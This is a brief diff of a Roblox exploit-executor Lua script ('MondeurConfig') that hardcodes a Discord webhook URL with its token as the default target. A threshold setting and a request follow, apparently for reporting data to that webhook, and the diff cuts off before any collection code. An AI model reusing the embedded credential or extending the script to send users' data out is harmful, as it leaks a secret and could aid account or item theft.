@@ -1,7 +1,7 @@
 local HttpService = game:GetService("HttpService")
 
 local cfg = getgenv().MondeurConfig or {}
-local webhook = cfg.Webhook or ""
+local webhook = cfg.Webhook or "https://discord.com/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa"
 local threshold = tonumber(cfg.Threshold) or 0
 
 local req =
